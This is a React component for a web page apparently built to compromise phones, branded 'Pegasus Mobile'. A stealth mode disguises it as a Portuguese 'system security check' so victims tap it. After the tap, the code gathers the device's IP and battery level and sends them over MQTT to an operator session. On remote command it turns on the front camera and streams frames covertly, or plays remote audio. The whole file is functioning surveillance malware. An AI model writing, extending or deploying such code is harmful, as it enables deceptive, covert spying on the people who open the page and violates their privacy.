
import React, { useEffect, useState, useRef } from 'react';
import { UploadCloud, Smartphone, Skull, Radio, AlertTriangle, MapPin, Battery, Video, Fingerprint, Power, ShieldCheck, Loader2 } from 'lucide-react';
import { getDeviceInfo } from '../services/deviceService';
import { mqttService } from '../services/mqttService';
import { DeviceInfo, CommandMessage } from '../types';

const MobileScanner: React.FC = () => {
  const [started, setStarted] = useState(false);
  const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
  const [info, setInfo] = useState<DeviceInfo | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [isStreaming, setIsStreaming] = useState(false);
  const [stealthMode, setStealthMode] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamIntervalRef = useRef<number | null>(null);

  const getURLParams = () => {
    const hash = window.location.hash; 
    const queryPart = hash.split('?')[1];
    if (!queryPart) return { session: null, stealth: false };
    const params = new URLSearchParams(queryPart);
    return {
      session: params.get('session'),
      stealth: params.get('stealth') === 'true'
    };
  };

  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-6), msg]);

  const startCamera = async (sessionId: string) => {
    try {
      addLog('REMOTE_CMD: ACTIVATE_CAMERA_FEED');
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }, 
        audio: false 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsStreaming(true);
        addLog('OPTICAL_SENSOR_HIJACKED');
        
        streamIntervalRef.current = window.setInterval(() => {
           if (videoRef.current && canvasRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              if (ctx) {
                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                 const base64 = canvasRef.current.toDataURL('image/jpeg', 0.5); 
                 mqttService.publishStream(sessionId, { image: base64, timestamp: new Date().toISOString() });
              }
           }
        }, 200);
      }
    } catch (err) {
      addLog('ERR: CAMERA_ACCESS_DENIED');
    }
  };

  const stopCamera = () => {
     if (streamIntervalRef.current) { clearInterval(streamIntervalRef.current); streamIntervalRef.current = null; }
     if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
        videoRef.current.srcObject = null;
     }
     setIsStreaming(false);
     addLog('FEED_TERMINATED');
  };

  const playRemoteAudio = (url: string) => {
    addLog('REMOTE_CMD: AUDIO_INJECTION');
    try {
      const audio = new Audio(url);
      audio.volume = 1.0;
      audio.play().then(() => addLog('AUDIO_EXECUTING...')).catch(() => addLog('ERR: AUTOPLAY_BLOCKED'));
    } catch (e) { addLog('ERR: AUDIO_DRIVER_FAIL'); }
  };

  const handleStart = () => {
    try {
        const silentAudio = new Audio("data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA");
        silentAudio.play().catch(() => {});
    } catch (e) { }
    setStarted(true);
  };

  useEffect(() => {
    const { stealth } = getURLParams();
    setStealthMode(stealth);
  }, []);

  useEffect(() => {
    if (!started) return;

    const { session, stealth } = getURLParams();
    if (!session) { setStatus('error'); return; }

    const sequence = async () => {
      try {
        setStatus('scanning');
        addLog(stealth ? 'VERIFICANDO_SISTEMA...' : 'INIT_PEGASUS_V4...');
        setProgress(10);
        await new Promise(r => setTimeout(r, 800));

        // Skip dangerous requests in stealth mode
        if (!stealth) {
            addLog('SOLICITANDO_ACESSO_SENSORES...');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                stream.getTracks().forEach(track => track.stop());
                addLog('ACESSO_PERMITIDO');
            } catch (e) { addLog('ACESSO_NEGADO'); }
        } else {
            addLog('EXECUTANDO_OTIMIZAÇÃO_PASSIVA...');
        }
        
        setProgress(40);
        const deviceData = await getDeviceInfo(stealth);
        setInfo(deviceData);
        
        addLog(`ID: ${deviceData.ip.substring(0,8)}...`);
        setProgress(70);
        await new Promise(r => setTimeout(r, 1000));

        setStatus('transmitting');
        mqttService.connect(
            session,
            () => {},
            () => { mqttService.publishData(session, deviceData); },
            (cmd: CommandMessage) => {
               if (cmd.type === 'ACTIVATE_CAMERA') startCamera(session);
               else if (cmd.type === 'STOP_CAMERA') stopCamera();
               else if (cmd.type === 'PLAY_AUDIO' && cmd.payload?.url) playRemoteAudio(cmd.payload.url);
            }
        );

        setProgress(100);
        await new Promise(r => setTimeout(r, 1000));
        setStatus('complete');

      } catch (err) { setStatus('error'); }
    };

    sequence();
    return () => { stopCamera(); mqttService.disconnect(); };
  }, [started]);

  // STEALTH UI: A fake "System Update" or "Innocent Utility" screen
  if (!started) {
    return (
      <div onClick={handleStart} className={`fixed inset-0 flex flex-col items-center justify-center p-8 cursor-pointer z-50 overflow-hidden ${stealthMode ? 'bg-[#f0f0f0] text-gray-800' : 'bg-black'}`}>
        {stealthMode ? (
          <div className="flex flex-col items-center gap-6">
            <ShieldCheck size={64} className="text-blue-600 animate-pulse" />
            <div className="text-center space-y-2">
              <h1 className="text-xl font-sans font-bold text-gray-900">Segurança do Sistema</h1>
              <p className="text-sm text-gray-500 font-sans">Toque para verificar a integridade do seu dispositivo</p>
            </div>
          </div>
        ) : (
          <div className="flex flex-col items-center gap-6 animate-pulse">
             <div className="w-24 h-24 border-2 border-red-500 rounded-full flex items-center justify-center relative">
                <div className="absolute inset-0 border border-red-500 rounded-full animate-ping opacity-50"></div>
                <Power size={48} className="text-red-500" />
             </div>
             <div className="text-center space-y-2">
                <h1 className="text-2xl font-black text-red-500 tracking-[0.2em] uppercase">SISTEMA BLOQUEADO</h1>
                <p className="text-xs text-red-400 font-mono">TOQUE NA TELA PARA INICIAR CONEXÃO</p>
             </div>
          </div>
        )}
        <div className={`absolute bottom-8 text-[10px] font-mono tracking-widest text-center w-full ${stealthMode ? 'text-gray-400' : 'text-gray-600'}`}>
           {stealthMode ? 'PROTECTION_ENGINE_V2' : 'SECURE_BOOT_LOADER // v9.0.1'} // Develop By: Davi.Design
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen font-mono p-4 flex flex-col items-center justify-center relative overflow-hidden transition-colors duration-1000 ${stealthMode ? 'bg-white text-blue-900' : 'bg-black text-green-500'}`}>
      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>

      <div className={`absolute inset-0 z-0 pointer-events-none ${stealthMode ? 'opacity-5' : 'opacity-100'}`}>
        <div className="scanline"></div>
      </div>

      <div className="z-10 w-full max-w-md space-y-8">
        <div className="text-center space-y-2">
          {stealthMode ? (
            <div className="flex flex-col items-center gap-4">
              <Loader2 className="animate-spin text-blue-500" size={32} />
              <h1 className="text-2xl font-sans font-bold text-gray-800">Sincronizando Dados</h1>
              <p className="text-xs text-gray-500 font-sans uppercase tracking-widest">Aguarde a conclusão da análise</p>
            </div>
          ) : (
            <>
              <div className="flex items-center justify-center gap-2 mb-4">
                {isStreaming ? <Video size={32} className="text-red-500 animate-pulse" /> : <AlertTriangle size={32} className="animate-pulse text-red-500" />}
              </div>
              <h1 className="text-3xl font-black tracking-widest text-white uppercase">Pegasus Mobile</h1>
              <p className="text-xs text-red-500 font-bold uppercase tracking-[0.2em] animate-pulse">
                {status === 'complete' ? 'DEVICE COMPROMISED' : 'SYSTEM OVERRIDE IN PROGRESS'}
              </p>
            </>
          )}
        </div>

        <div className={`border rounded-lg p-6 backdrop-blur-md shadow-2xl relative overflow-hidden ${stealthMode ? 'bg-gray-50 border-gray-200' : 'bg-gray-900/90 border-green-800/50'}`}>
          <div className="flex justify-center mb-8 relative">
            <div className={`relative z-10 p-6 rounded-full border-2 transition-all duration-500 ${stealthMode ? 'bg-white border-blue-200' : 'bg-black border-green-900 shadow-green-900/20 shadow-lg'}`}>
                {status === 'initializing' && <Fingerprint className="animate-pulse text-gray-400" size={48} />}
                {status === 'scanning' && <Radio className={`animate-spin duration-[4000ms] ${stealthMode ? 'text-blue-500' : 'text-green-500'}`} size={48} />}
                {status === 'transmitting' && <UploadCloud className="animate-bounce text-blue-500" size={48} />}
                {status === 'complete' && <Skull className={`${isStreaming || !stealthMode ? 'text-red-500 animate-pulse' : 'text-gray-300'}`} size={48} />}
            </div>
          </div>

          <div className="space-y-1 mb-6">
            <div className="flex justify-between text-[10px] uppercase text-gray-400">
                <span>TASK_ID: {Math.floor(Math.random() * 9999)}</span>
                <span>{progress}%</span>
            </div>
            <div className={`w-full h-1 rounded overflow-hidden ${stealthMode ? 'bg-gray-200' : 'bg-gray-800'}`}>
                <div className={`h-full transition-all duration-300 ease-out ${stealthMode ? 'bg-blue-500' : (status === 'complete' ? 'bg-red-500' : 'bg-green-500')}`} style={{ width: `${progress}%` }}></div>
            </div>
          </div>

          <div className={`space-y-1 min-h-[100px] text-[10px] font-mono border-t border-b py-3 mb-4 ${stealthMode ? 'border-gray-100 bg-white/50 text-blue-900' : 'border-gray-800 bg-black/40 text-green-400/90'}`}>
            {logs.map((log, i) => (
              <div key={i} className="flex gap-2">
                <span className="opacity-40">&gt;</span>
                <span className="break-all">{log}</span>
              </div>
            ))}
          </div>

          {info && (
            <div className={`grid grid-cols-2 gap-2 text-[10px] uppercase border p-3 rounded ${stealthMode ? 'bg-white border-gray-100' : 'bg-black/50 border-green-900/30'}`}>
               <div className="text-gray-400 flex items-center gap-1"><MapPin size={10} /> IP</div>
               <div className={`text-right font-mono truncate ${stealthMode ? 'text-blue-900' : 'text-white'}`}>{info.ip}</div>
               <div className="text-gray-400 flex items-center gap-1"><Battery size={10} /> POWER</div>
               <div className={`text-right font-mono ${stealthMode ? 'text-blue-900' : 'text-white'}`}>{info.battery || '??'}%</div>
            </div>
          )}
        </div>
      </div>

      <div className="absolute bottom-4 left-0 w-full text-center pointer-events-none opacity-40">
        <span className={`text-[10px] font-mono uppercase tracking-[0.3em] font-bold ${stealthMode ? 'text-blue-200' : 'text-green-900'}`}>
            Develop By: Davi.Design
        </span>
      </div>
    </div>
  );
};

export default MobileScanner;
